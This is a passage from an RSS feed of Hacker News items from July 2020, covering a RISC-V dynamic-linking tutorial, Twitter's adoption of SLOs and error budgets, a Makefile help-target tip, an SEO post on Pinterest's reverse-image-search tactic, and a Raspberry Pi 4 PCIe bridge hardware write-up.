<pre>00000000000101b0 T abort<br>000000000006bb38 S __abort_msg<br>0000000000029aa8 t add_alias2.isra.0.part.0<br>00000000000497c6 t add_fdes<br>00000000000297ea t add_module.isra.0<br>000000000003aa4e t add_name_to_object.isra.0<br>000000000003ab5c t add_path.isra.0.constprop.0<br>000000000006b8d0 d adds.8114<br>000000000002fe2e T __add_to_environ<br>00000000000431b6 t add_to_global<br>000000000001adb4 t adjust_wide_data<br>000000000006bba0 V __after_morecore_hook<br>0000000000012d3a t alias_compare<br>000000000002338a W aligned_alloc<br>000000000006bb80 s aligned_heap_area<br>000000000003ff04 t allocate_dtv<br>000000000003a40c T __alloc_dir<br>000000000006ca38 b any_objects_regis</pre>



<hr>



<h2 id="dynamic">Dynamic Libraries (shared objects)</h2>



<p>Dynamic libraries end in .so, which stands for <em>shared object</em>. These libraries contain code that will not be added directly into the executable. Instead a program called the <em>dynamic linker</em> will be responsible for taking code from the .so files and adding them into an executing program. We can also add symbols ourselves using the -ldl (dynamic linker) library.</p>



<p>We can think of the term <em>dynamic</em> as <em>run-time</em>. That is, we don’t actually load the code into our program until the program actually runs. We can see this with something as simple as printf. We can examine our executable and we don’t see printf’s code. Instead, we see printf’s <em>stub</em>. This stub will then be replaced by the dynamic loader when the program executes.</p>



<p>When we link with a dynamic, shared object, those symbols that can be added at run time will remain unresolved. We will have the symbols’ names put into a table just so we know it’s out there somewhere. However, with shared objects, we now can get that <em>unresolved reference</em> (or symbol) at run-time! If you have arch-linux and have ever compiled anything yourself, you might’ve run into this phenomenon.</p>



<hr>



<h2>Making a Shared Library</h2>



<p>Let’s go ahead and turn our test2 file into a shared object. This is fairly easy to do with gcc:</p>



<pre>riscv64-unknown-linux-gcc -fPIC -shared -o libtest2.so test2.o</pre>



<p>The switch -fPIC stands for <em>position independent code</em>. That means all offsets cannot be relative outside of the library itself, and this is usually the case for most shared libraries. In this case, the generated code will be placed into a table to find the offsets. This is required since the library, or specific symbols in the library, can be loaded into any location by the dynamic linker.</p>



<p>Then, we can compile our test program to link to this shared library:</p>



<pre>riscv64-unknown-linux-gcc -o test test.o -L. -ltest2</pre>



<p>In the command above, I am specify the library search path with -L, so -L. means to look in the current directory. Then, I specify the library to link with using -ltest2. GCC will automatically prepend lib and append .so to make libtest2.so.</p>



<hr>



<h2 id="analyze">Analyzing A Shared Program</h2>



<p>First, we compile in the location of our library. We can see these shared libraries using the ldd command.</p>



<pre>smarz@DOMO:~ $ ./test<br>
./test: error while loading shared libraries: libtest2.so: cannot open shared object file: No such file or directory</pre>



<p>So, when I run my program, it looks at a certain path to find your libraries. This is analogous to the PATH environment variable, except in Linux (and some UNIXes), we use LD_LIBRARY_PATH. Shown below, if I change my path so the dynamic linker can find my library, it functions properly:</p>



<pre>smarz@DOMO:~ $ LD_LIBRARY_PATH=/home/smarz ./test 10 20<br>
Data = 200</pre>



<hr>



<h2 id="unresolved">Unresolved at Run Time</h2>



<p>When we link a program, many of the symbols will remain unresolved. This tells us what symbols the dynamic linker is responsible for loading from the shared objects (libraries). We can see these unresolved symbols using the nm command:</p>



<div><figure><img src="https://blog.stephenmarz.com/wp-content/uploads/2020/06/image.png" alt="" width="544" height="276" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/06/image.png 544w, https://blog.stephenmarz.com/wp-content/uploads/2020/06/image-300x152.png 300w" sizes="(max-width: 544px) 100vw, 544px"><figcaption>Partial list of symbols in our test program</figcaption></figure></div>



<p>You can see that puts is unresolved (capital U letter), …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.stephenmarz.com/2020/06/22/dynamic-linking/">https://blog.stephenmarz.com/2020/06/22/dynamic-linking/</a></em></p>]]>
            </description>
            <link>https://blog.stephenmarz.com/2020/06/22/dynamic-linking/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23704160</guid>
            <pubDate>Wed, 01 Jul 2020 17:35:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SLO Adoption at Twitter]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 4 (<a href="https://news.ycombinator.com/item?id=23702876">thread link</a>) | @hannahblameless
<br/>
July 1, 2020 | https://www.blameless.com/blog/slo-adoption-twitter | <a href="https://web.archive.org/web/*/https://www.blameless.com/blog/slo-adoption-twitter">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br><em>This is the second article of a two-part series. Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.blameless.com/blog/slo-adoption-twitter">https://www.blameless.com/blog/slo-adoption-twitter</a></em></p>]]>
            </description>
            <link>https://www.blameless.com/blog/slo-adoption-twitter</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702876</guid>
            <pubDate>Wed, 01 Jul 2020 15:55:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to list all the targets on a Makefile]]>
            </title>
            <description>
<![CDATA[
Score 133 | Comments 58 (<a href="https://news.ycombinator.com/item?id=23702756">thread link</a>) | @diamantidis_io
<br/>
July 1, 2020 | https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets | <a href="https://web.archive.org/web/*/https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><code>make</code> is great tool to orchestrate the setup and build process of a project. It expects a <code>Makefile</code>, where we define targets to execute, like for example <code>install</code> and <code>run</code>. Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>
</code></pre></div></div> <p>Then, we will use the <code>grep</code> and <code>sed</code> command to get the name of the target and the documentation, like in the following snippet:</p> <div><div><pre><code>.DEFAULT_GOAL :<span>=</span> <span>help</span>
.PHONY: <span>help

help</span>:
	@grep <span>-E</span> <span>'^[a-zA-Z0-9_-]+:.*?## .*$$'</span> <span>$(</span>MAKEFILE_LIST<span>)</span> <span>\</span>
	| <span>sed</span> <span>-n</span> <span>'s/^\(.*\): \(.*\)##\(.*\)/\1\3/p'</span> <span>\</span>
	| column <span>-t</span>  <span>-s</span> <span>' '</span>
</code></pre></div></div> <p>We will also set the <code>.PHONY</code> and the <code>.DEFAULT_GOAL</code> variables. The last one will make <code>help</code> the default target when running <code>make</code> without a specific target.</p> <p>Now, if we head back to the Terminal app, and run <code>make</code>, we will get the list of the documented targets as an output <img title=":rocket:" alt=":rocket:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png" height="20" width="20"></p>
<pre><code>install  Install
run      Run
</code></pre>
</div></div>]]>
            </description>
            <link>https://diamantidis.github.io/tips/2020/07/01/list-makefile-targets</link>
            <guid isPermaLink="false">hacker-news-small-sites-23702756</guid>
            <pubDate>Wed, 01 Jul 2020 15:46:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deconstructing Pinterest’s reverse-image-search SEO growth hack]]>
            </title>
            <description>
<![CDATA[
Score 208 | Comments 107 (<a href="https://news.ycombinator.com/item?id=23701998">thread link</a>) | @jenny8lee
<br/>
July 1, 2020 | https://www.rankscience.com/blog/pinterest-image-seo-growth-hack | <a href="https://web.archive.org/web/*/https://www.rankscience.com/blog/pinterest-image-seo-growth-hack">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <div id="post-418">
		<div>	
		<p><img src="https://pbs.twimg.com/profile_images/1178728529187495937/xbH7cGaT_400x400.jpg" alt="Ryan Bednar" width="55" height="55"></p>
<p>By <strong><a href="https://twitter.com/ryanbed">Ryan Bednar</a></strong> (CEO of <a href="https://www.rankscience.com/">RankScience</a>)</p>
<blockquote><p><span>Update</span>: This post got a ton of traffic on Hacker News today and&nbsp;Pinterest reached out to comment: “The claim that we scrape Google search results is false. We do not, and never have, scraped Google search results at any time.” The original article suggested Pinterest scrapes Google directly, but instead it seems more likely that Pinterest grabs data from Google through it’s Chrome Extension. We’ll update this post as we learn more from them.</p></blockquote>
<p>A few weeks ago in the Twitterverse, @SwiftOnSecurity <a href="https://twitter.com/SwiftOnSecurity/status/1258875333446717445" target="_blank" rel="noopener noreferrer">outed Pinterest</a> for using a somewhat surprising SEO tactic: for every image uploaded to Pinterest that doesn’t have any real metadata or description of the picture, Pinterest automatically performs a reverse image search on Google, scrapes all of the metadata and descriptions they can find for that image, and then uploads that content onto their site and pretends it’s from their own users.</p>
<p>This is interesting for a couple of reasons:</p>
<ul>
<li dir="ltr" role="presentation"><span>Google typically does not react kindly to anyone trying to scrape its results </span><i><span>for any reason</span></i><span>, so this is incredibly difficult to do at scale (across hundreds of millions of photos) without being blocked.</span></li>
<li dir="ltr" role="presentation"><span>Often when somewhat shady SEO tactics are exposed on Twitter, Google responds by issuing a manual action and penalizing the offending site in search results. This famously happened to </span><a href="https://marketingland.com/10-big-brands-that-were-penalized-by-google-69646"><span>Genius years ago as they were put in time-out</span></a><span> and told to re-evaluate their blackhat SEO strategy. </span></li>
<li dir="ltr" role="presentation"><span>Pinterest is a publicly traded company, so if they’re penalized it could hurt the company’s stock price ($PINS).</span></li>
</ul>
<p><i><span>Content relevance</span></i><span>&nbsp;is a ranking factor in Google. The closer semantically you can describe a topic or image to how Google understands it, the better your chances of ranking higher in their index. Will Google find this behavior flagrantly blackhat and respond accordingly? </span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png" alt="" width="546" height="293" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM.png 1208w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-300x161.png 300w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-1024x549.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-768x412.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-26-at-9.59.05-AM-600x322.png 600w" sizes="(max-width: 546px) 100vw, 546px"></p>

<h2><strong>Some background on Pinterest SEO</strong></h2>
<p><span>Pinterest has been super successful with SEO growth over the years. Their post on </span><a href="https://medium.com/pinterest-engineering/demystifying-seo-with-experiments-a183b325cf4c"><span>Demystifying SEO with Experiments</span></a><span> was particularly inspirational for me in deciding to start </span><a href="https://www.rankscience.com/"><span>RankScience</span></a><span>, an SEO automation and A/B testing company. So any time I hear about programmatic SEO tactics that work on a site as large as Pinterest, with 800M+ pages indexed in Google, I’m intrigued. This is obviously a strategy they would never talk about doing publicly, so it’s fascinating to see it exposed and called out like this.</span></p>
<h2><strong>So how exactly does this Pinterest SEO growth hack work?</strong></h2>
<ul>
<li><span>User uploads a photo to Pinterest without any meta data.</span></li>
<li><span>Pinterest performs a reverse image search on Google for that image.</span></li>
<li><span>Pinterest scrapes all the text captions for related photos that appear from Google.</span></li>
<li><span>Pinterest publishes these text captions under </span><b>What others are saying</b><span> on their own page.</span></li>
<li></li>
</ul>

<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png" alt="Pinterest SEO growth hack" width="504" height="652" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png 940w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-232x300.png 232w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-792x1024.png 792w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-768x993.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-600x776.png 600w" sizes="(max-width: 504px) 100vw, 504px"></p>

<p><span>Voila! Instant unique and scalable SEO text content that maps directly to Google’s understanding of the photo.&nbsp;</span><span>Google indexes the Pinterest page with the new text content and ranks it higher because of the strong relevance of the text on the page to its existing understanding of the photo.&nbsp;</span><span>Rinse and repeat across millions of photos.</span></p>
<h2><strong>The SEO community took notice:</strong></h2>
<h2><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png" alt="Pinterest SEO growth hack community reaction" width="478" height="191" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-300x120.png 300w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-1024x410.png 1024w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-768x307.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM-600x240.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-07-01-at-8.34.45-AM.png 1334w" sizes="(max-width: 478px) 100vw, 478px"></h2>
<h2><strong>And what was Google’s response?</strong></h2>
<p><span>John Mu, Webmaster Trends Analyst at Google, and part of the webspam team responsible for policing SEO behavior, chimed in on the thread and offered support for the content available on Pinterest. He didn’t comment directly on this behavior, but I’d bet that the popularity of this thread alerted some people at Google and that there’s an investigation going on internally into this practice at Pinterest. ($PINS) The only reason that Google would let this slide is that they don’t view policing Image Search as high priority.</span></p>
<h2><b>How you can take advantage of Content Relevance to rank higher in Google</b></h2>
<p><span>Content relevance is an important ranking factor in Google search. It’s widely accepted that Google calculates relevance for individual URLs and pieces of content as they relate to a particular query or keyword, and that these quantitative relevance calculations play a role in its ranking algorithms. In the Pinterest example, they’re taking an image that Google already knows about and grabbing multiple text descriptions of that image from Google itself, then combining them in one place to provide one comprehensive page describing the image. This maps exactly to Google’s existing understanding of that image, so the page then likely achieves a very high content relevance score.</span></p>
<p><span>One way you can apply what Pinterest is doing to improve the rankings of content on your own site is to use a NLP method called </span><a href="https://en.wikipedia.org/wiki/Tf%E2%80%93idf"><span>TF-IDF</span></a><span> (term frequency-inverse document frequency). This is a text analysis technique that helps reveal how important a word or phrase is to a document in a corpus (example: a collection of URLs). You can either break out a spreadsheet and do this by hand, or use an advanced content optimization tool like <a href="https://www.rankscience.com/seo-content-insights">RS Content Insights</a> to do this analysis at scale.&nbsp; </span></p>
<p><span>Let’s say that you wanted to rank in Google for </span><i><span>google image search seo</span></i><span>. We already know which documents Google thinks are the most relevant and highest authority for this search term because those are the pages that show up in search results. So we can start by downloading the top 25 URLs ranking in Google for </span><i><span>google image search seo</span></i><span> and performing tf–idf analysis across all of those documents to reveal key topic entities that are semantically related to the search term.</span></p>
<p><span>Here are the topic entities produced by TF-IDF when we ran this post that you’re reading right now through Content Insights for </span><i><span>google image search seo</span></i><span>.</span></p>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png" alt="google image search seo" width="640" height="693" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-946x1024.png 946w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-277x300.png 277w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-768x831.png 768w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM-600x649.png 600w, https://www.rankscience.com/wp-content/uploads/2020/07/Screen-Shot-2020-06-30-at-5.02.16-PM.png 1388w" sizes="(max-width: 640px) 100vw, 640px"></p>
<p><span>You’ll see that TF-IDF analysis suggests using keywords like alt tags, alt text, image quality, file size, and stock photos, which are all associated with </span><i><span>google image search seo</span></i><span>, even though they are not replacements or alternatives to the keyword. This gets directly at Google’s understanding of the topic and using this method you can get your content ranking your post higher for having a better content relevance score — it’s often surprisingly effective. In addition to </span><a href="https://www.rankscience.com/coderwall-seo-split-test"><span>SEO A/B testing</span></a><span>, which everyone should be doing by now, using NLP and TF-IDF to refresh and update existing long-form content on your site is an incredibly effective way to grow search traffic and rankings in 2020, and an important tool in any marketing team’s tool kit.</span></p>
<h3>Related Posts</h3>
<ul>
<li><a href="https://www.rankscience.com/coderwall-seo-split-test">How Coderwall grew SEO traffic by 57% with a single SEO A/B test</a></li>
<li><a href="https://www.rankscience.com/blog/how-businesses-boost-sales-with-seo-a-b-testing-on-ecommerce-sites">How eCommerce sites are using SEO A/B testing to boost sales</a></li>
</ul>
<p><img src="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png" alt="" width="157" height="157" srcset="https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo.png 157w, https://www.rankscience.com/wp-content/uploads/2020/07/Outline_Logo-150x150.png 150w" sizes="(max-width: 157px) 100vw, 157px"></p>
<p>Get Data-Driven about growing your traffic with <a href="https://www.rankscience.com/">RankScience</a>.</p>

		
	</div>

	</div>
    
                </div></div>]]>
            </description>
            <link>https://www.rankscience.com/blog/pinterest-image-seo-growth-hack</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701998</guid>
            <pubDate>Wed, 01 Jul 2020 14:52:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi 4 PCIe bridge “chip”]]>
            </title>
            <description>
<![CDATA[
Score 232 | Comments 167 (<a href="https://news.ycombinator.com/item?id=23701208">thread link</a>) | @fanf2
<br/>
July 1, 2020 | https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/ | <a href="https://web.archive.org/web/*/https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>After seeing the work done by <a rel="noreferrer noopener" href="http://mloduchowski.com/en/blog/raspberry-pi-4-b-pci-express/" target="_blank">Thomasz Mloduchowski</a> and <a rel="noreferrer noopener" href="http://labs.domipheus.com/blog/raspberry-pi-4-pci-express-it-actually-works-usb-sata-gpu/" target="_blank">Colin Riley</a> with managing to bridge the Raspberry Pi 4’s PCI-Express bus to a USB 3.0 port, and then seeing <a rel="noreferrer noopener" href="https://hackaday.com/2019/09/05/pcie-multiplier-expands-raspberry-pi-4-possibilities/#comment-6177569" target="_blank">these comments on hack-a-day</a>, I thought I would give it a go too!</p> <p>So, here’s a PCIe bridge “chip” that simply replaces the VL805 USB 3.0 controller chip on the Pi, giving access to the PCI-Express bus on a USB 3.0 port. <s>However, this does mean losing all USB functionality of the Pi. That could be a bit of a problem if you ever mess up the networking and need to attach a keyboard.</s> Never mind, it seems that the USB-C power connector <a rel="noreferrer noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=29&amp;t=246348&amp;p=1678554" target="_blank">can run as a USB host</a>, allowing a keyboard to be connected if 5V power is supplied through the GPIO header instead.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg" alt="" width="848" height="375" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-300x133.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-768x341.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1536x681.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg 1761w" sizes="(max-width: 848px) 100vw, 848px"></a></figure></div> <p>The bridge “chip” is a 0.8mm thick PCB from OSHPark with copper pads in the same locations as a real VL805 QFN68 IC package, then traces connecting the PCIe pads to the USB pads that connect to the upper USB 3.0 port. RESET, WAKE and a few other signals were also connected to the lower USB 3.0 port.</p> <figure><table><thead><tr><th>PCIe Signal</th><th>Direction</th><th>USB Signal</th></tr></thead><tbody><tr><td>REFCLK+</td><td>Host -&gt; Device</td><td>D-</td></tr><tr><td>REFCLK-</td><td>Host -&gt; Device</td><td>D+</td></tr><tr><td>HSO+</td><td>Host (TX) -&gt; Device (RX)</td><td>RX-</td></tr><tr><td>HSO-</td><td>Host (TX) -&gt; Device (RX)</td><td>RX+</td></tr><tr><td>HSI+</td><td>Device (TX) -&gt; Host (RX)</td><td>TX-</td></tr><tr><td>HSI-</td><td>Device (TX) -&gt; Host (RX)</td><td>TX+</td></tr><tr><td>RESET</td><td>Host -&gt; Device</td><td>D- (lower port)</td></tr><tr><td>WAKE (not connected anywhere)</td><td>Device -&gt; Host</td><td>D+ (lower port)</td></tr><tr><td>CLKREQ</td><td>Host -&gt; Device</td><td>RX+ (lower port)</td></tr><tr><td>PONRST</td><td>Not a PCIe signal, connected like a reset pin on a microcontroller.</td><td>RX- (lower port)</td></tr></tbody></table><figcaption>HSI and HSO (in and out) are from the perspective of the host controller. Where host HSO/TX will connect to device RX and host HSI/RX to device TX. Man, this is really confusing with TX, RX, device, host, passing through USB, which side is which… 😕</figcaption></figure> <p>There’s also a small hole near the centre, this allows any leftover solder from the large ground pad to have somewhere to go when placing the chip, otherwise the solder could end up squashed out around the edge, shorting out the pads. The PCB is slightly larger than the QFN68 package, as there is a limit on how close the copper can be to the edge. The fabricated PCB should be sanded down to the correct size, so that the cross-section of the copper pads can be seen at the edge of the PCB, just like on a QFN package.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg 1760w" sizes="(max-width: 1024px) 